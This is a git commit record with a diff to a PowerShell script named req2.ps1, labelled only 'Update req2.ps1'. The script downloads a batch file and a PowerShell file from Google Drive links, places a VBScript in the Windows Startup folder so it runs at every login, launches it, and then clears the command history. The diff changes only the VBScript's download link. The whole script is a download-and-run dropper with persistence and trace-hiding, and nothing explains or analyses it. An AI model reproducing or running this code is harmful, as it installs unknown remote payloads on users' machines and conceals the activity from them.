2c42303e8ee93783eafeff98817f673d5a598c5d
dyaa1997dyaa <119899779+dyaa1997dyaa@users.noreply.github.com>
2024-10-24 04:20:52 -0700

    Update req2.ps1

--- req2.ps1
+++ req2.ps1
@@ -2,7 +2,7 @@ cd D:\Users\$Env:UserName
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1ZTZxvMinJVQJBwa4gRCxdGnz4eo_MUDv" -outfile "win64.bat"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=12qElj9lDxMST2t7EsKmljDDa6AR9h_JT" -outfile "user.ps1"
 cd "D:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1TiujQ7R1q7EaTFaUXbOkdCQuwuwksriP" -outfile "startup.vbs"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1mYikyVPT0uKA-PEIJwrpT9kdJY2P5H6l" -outfile "startup.vbs"
 start startup.vbs
 Clear-History
 exit
